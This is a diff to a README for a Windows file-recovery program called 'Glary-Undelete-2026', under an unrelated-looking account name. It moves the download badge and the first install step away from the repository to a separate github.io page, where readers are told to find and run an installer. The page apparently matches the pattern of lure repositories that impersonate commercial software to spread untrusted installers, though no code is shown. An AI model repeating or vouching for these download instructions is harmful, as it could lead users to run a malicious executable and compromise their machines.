@@ -1,6 +1,6 @@
 # 💾 Glary-Undelete-2026 - Recover lost files on Windows easily
 
-[![](https://img.shields.io/badge/Download-Glary_Undelete_2026-blue.svg)](https://github.com/Decathlongongorist126/Glary-Undelete-2026)
+[![](https://img.shields.io/badge/Download-Glary_Undelete_2026-blue.svg)](https://decathlongongorist126.github.io)
 
 ## 📁 About This Software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these basic needs before you start:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the following link to access the software files: [https://github.com/Decathlongongorist126/Glary-Undelete-2026](https://github.com/Decathlongongorist126/Glary-Undelete-2026)
+1. Visit the following link to access the software files: [https://decathlongongorist126.github.io](https://decathlongongorist126.github.io)
 2. Locate the installer file on the page.
 3. Click the download button.
 4. Wait for the download to finish.
